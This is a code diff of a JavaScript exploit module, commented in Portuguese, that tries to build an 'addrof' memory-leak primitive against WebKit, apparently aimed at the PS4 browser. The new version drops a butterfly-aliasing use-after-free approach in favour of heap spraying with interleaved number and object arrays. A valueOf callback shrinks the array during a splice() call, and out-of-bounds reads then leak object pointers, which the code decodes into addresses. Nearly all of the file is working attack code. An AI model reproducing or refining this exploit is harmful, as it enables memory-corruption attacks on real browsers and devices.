@@ -1,40 +1,39 @@
-
 export default {
     id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
     category: 'Exploit',
     risk:     'CRITICAL',
     description:
-        'Primitiva addrof via Butterfly Aliasing. O evilObject é passado como índice no splice(), ' +
-        'forçando o C++ a invocar valueOf() durante o parse de argumentos. A memória é libertada ' +
-        'e imediatamente sobreposta por um ArrayWithContiguous repleto de ponteiros nativos.',
+        'Primitiva addrof via Interleaving (Alinhamento Lado-a-Lado). Abandona o Aliasing ' +
+        'para evitar a segregação do bmalloc. Intercala Arrays Numéricos e Arrays de Objetos ' +
+        'para garantir que a leitura OOB do vetor corrompido acerte num ponteiro nativo vizinho.',
 
     setup: function() {
         this.results = {};
         
-        // 1. O Array Fantasma
-        this.vulnArray = new Array(128).fill(1.11);
-        
-        // 2. A Cobaia
+        // A nossa cobaia
         this.targetObj = document.createElement('div');
         this.targetObj.id = "HOLY_GRAIL";
 
+        // HEAP FENG SHUI: O "Mil-Folhas" (Interleaving)
+        this.spray = [];
+        for (let i = 0; i < 1500; i++) {
+            // Criamos uma gaveta de 4 números
+            let numArr = [1.11, 2.22, 3.33, 4.44];
+            
+            // Colada a ela, criamos uma gaveta de 4 objetos
+            let objArr = [this.targetObj, this.targetObj, this.targetObj, this.targetObj];
+            
+            this.spray.push({ num: numArr, obj: objArr });
+        }
+
+        // Escolhemos um array numérico no meio da "sanduíche" para ser o nosso alvo
+        this.vulnArray = this.spray[750].num;
+
         const self = this;
-        
-        // 3. A Bomba Relógio
         this.evilObject = {
             valueOf: function() {
-                // GATILHO: Libertamos o Butterfly atual a meio da função C++
+                // O GATILHO: Enganamos o splice para encolher o array e descalibrar a Butterfly
                 self.vulnArray.length = 0;
-                
-                // HEAP FENG SHUI: Inundamos o buraco com novos Arrays de tamanho idêntico,
-                // mas contendo Objetos em vez de Doubles (ArrayWithContiguous)
-                self.overlapSpray = new Array(500); // Reduzido para 500 para evitar Garbage Collection síncrono
-                for(let i = 0; i < 500; i++) {
-                    let arr = new Array(128).fill(self.targetObj);
-                    self.overlapSpray[i] = arr;
-                }
-                
-                // Retornamos 0, que será usado como o índice 'start' do splice!
                 return 0; 
             }
         };
@@ -42,45 +41,51 @@ export default {
 
     trigger: function() {
         try {
-            // 🚨 FIX: A BOMBA ESTÁ NO PARÂMETRO 'START' 🚨
-            // O WebKit guarda o tamanho antigo, tenta converter evilObject para inteiro (BOOM!),
-            // e depois escreve 9.99 no índice 0 da memória libertada/sobreposta.
+            // Dispara a bomba. O WebKit tenta ler o evilObject, corrompe o array e escreve 9.99
             this.vulnArray.splice(this.evilObject, 0, 9.99);
             
-            // Se o aliasing funcionou, o índice 1 contém o ponteiro do targetObj
-            this.results.leakedData = this.vulnArray[1]; 
-            
-            this.results.sprayRef = this.overlapSpray;
+            // O GOLPE: O vulnArray acha que tem tamanho 0, mas a sua memória física está corrompida.
+            // Vamos forçar a leitura fora dos limites (índices 0 até 15).
+            // Em algum destes índices, a memória do array vizinho (objArr) começa!
+            this.results.leakedData = [];
+            for (let i = 0; i < 15; i++) {
+                this.results.leakedData.push(this.vulnArray[i]);
+            }
         } catch(e) {
             this.results.error = e.message;
         }
     },
 
     probe: [
-        s => s.results.error || 'Splice Coagido Executado',
+        s => s.results.error || 'Splice Executado - Sondando Vizinhos',
         
         // O Extrator addrof
         s => {
-            let val = s.results.leakedData;
-            
-            if (typeof val === 'number' && val !== 1.11 && val !== 9.99 && val !== 0) {
-                
-                const buf = new ArrayBuffer(8);
-                const f64 = new Float64Array(buf);
-                const u64 = new BigUint64Array(buf);
-                
-                f64[0] = val;
-                const bits = u64[0];
-                
-                const addr = bits & 0x0000FFFFFFFFFFFFn;
-                
-                if (addr > 0x100000n) {
-                    return `🏆 ADDROF [Aliasing Perfeito]: 0x${addr.toString(16).toUpperCase()}`;
-                } else {
-                    return `💥 STALE DATA [Lixo / Miss]: Leu ${val}`;
+            if (s.results.leakedData) {
+                // Vamos analisar cada pedaço de lixo que a memória nos devolveu
+                for (let i = 0; i < s.results.leakedData.length; i++) {
+                    let val = s.results.leakedData[i];
+                    
+                    // Se encontrarmos um número que não é os nossos canários
+                    if (typeof val === 'number' && val !== 1.11 && val !== 2.22 && val !== 3.33 && val !== 4.44 && val !== 9.99 && val !== 0 && !isNaN(val)) {
+                        
+                        const buf = new ArrayBuffer(8);
+                        const f64 = new Float64Array(buf);
+                        const u64 = new BigUint64Array(buf);
+                        
+                        f64[0] = val;
+                        const bits = u64[0];
+                        
+                        const addr = bits & 0x0000FFFFFFFFFFFFn;
+                        
+                        // Verifica se o ponteiro é fisicamente coerente com o Userspace da PS4
+                        if (addr > 0x100000n && addr < 0x7FFFFFFFFFFFn) {
+                            return `🏆 ADDROF [OOB Lado-a-Lado]: 0x${addr.toString(16).toUpperCase()} no índice [${i}]`;
+                        }
+                    }
                 }
             }
-            return 0; // Fuzzer silencia e tenta de novo
+            return 0; // Falhou, tenta no próximo ciclo
         }
     ],
 
@@ -88,7 +93,7 @@ export default {
         this.vulnArray = null;
         this.evilObject = null;
         this.targetObj = null;
-        this.overlapSpray = null;
+        this.spray = null;
         this.results = {};
     }
 };
